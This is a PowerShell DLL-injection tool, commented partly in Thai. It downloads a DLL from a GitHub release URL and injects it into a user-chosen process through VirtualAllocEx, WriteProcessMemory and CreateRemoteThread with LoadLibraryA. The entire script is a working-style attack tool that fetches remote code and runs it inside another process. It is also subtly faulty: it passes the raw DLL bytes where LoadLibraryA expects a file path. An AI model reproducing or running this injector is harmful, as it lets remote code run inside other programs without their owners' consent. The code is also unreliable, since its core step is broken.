$dllUrl_x86 = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1_x86.dll"
$dllUrl_x64 = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1_x64.dll"

Write-Host "=== INJECTOR ===" -ForegroundColor Cyan
Write-Host "Enter PID : " -NoNewline
$targetPid = [int](Read-Host)

$proc = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
if (-not $proc) { Write-Host "Process not found!" -ForegroundColor Red; Read-Host; exit }

$is32Bit = $proc.Modules | Where-Object { $_.ModuleName -eq "wow64.dll" }
if ($is32Bit) { 
    Write-Host "Target: 32-bit" -ForegroundColor Yellow
    $dllUrl = $dllUrl_x86 
} else { 
    Write-Host "Target: 64-bit" -ForegroundColor Yellow
    $dllUrl = $dllUrl_x64 
}

Write-Host "Downloading DLL..." -ForegroundColor Cyan
Write-Host "URL: $dllUrl" -ForegroundColor Gray

# ใช้ Invoke-WebRequest แทน WebClient
try {
    $response = Invoke-WebRequest -Uri $dllUrl -UseBasicParsing -Headers @{
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Accept" = "*/*"
    }
    $dllBytes = $response.Content
    Write-Host "Downloaded $($dllBytes.Length) bytes" -ForegroundColor Green
} catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

# ตรวจสอบว่าได้ DLL จริงหรือไม่ (ไฟล์ต้องมีขนาด > 0)
if ($dllBytes.Length -eq 0) {
    Write-Host "Downloaded file is empty!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int c);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out UIntPtr w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr sa, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32.dll")] public static extern bool GetExitCodeThread(IntPtr h, out uint c);
}
"@

$hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq 0) { 
    Write-Host "OpenProcess failed! Run as Administrator" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 
}
Write-Host "Process opened successfully" -ForegroundColor Green

$remoteBuffer = [Injector]::VirtualAllocEx($hProcess, 0, $dllBytes.Length, 0x3000, 0x04)
if ($remoteBuffer -eq 0) { 
    Write-Host "VirtualAllocEx failed" -ForegroundColor Red
    [Injector]::CloseHandle($hProcess)
    Read-Host "Press Enter to exit"
    exit 
}
Write-Host "Memory allocated at: 0x$($remoteBuffer.ToString('X'))" -ForegroundColor Green

$bytesWritten = [UIntPtr]::Zero
[Injector]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref] $bytesWritten)
Write-Host "DLL written to process memory" -ForegroundColor Green

$kernel32 = [Injector]::GetProcAddress([Injector]::LoadLibrary("kernel32.dll"), "LoadLibraryA")
$threadHandle = [Injector]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)

if ($threadHandle -eq 0) {
    Write-Host "CreateRemoteThread failed" -ForegroundColor Red
} else {
    Write-Host "Remote thread created, waiting for LoadLibrary..." -ForegroundColor Green
    [Injector]::WaitForSingleObject($threadHandle, 5000)
    $exitCode = 0
    [Injector]::GetExitCodeThread($threadHandle, [ref]$exitCode)
    if ($exitCode -eq 0) {
        Write-Host "LoadLibrary FAILED! Architecture mismatch or DLL issue" -ForegroundColor Red
    } else {
        Write-Host "LoadLibrary SUCCESS! DLL injected at: 0x$($exitCode.ToString('X'))" -ForegroundColor Green
    }
    [Injector]::CloseHandle($threadHandle)
}
[Injector]::CloseHandle($hProcess)

Write-Host "Done"
Read-Host "Press Enter to exit"
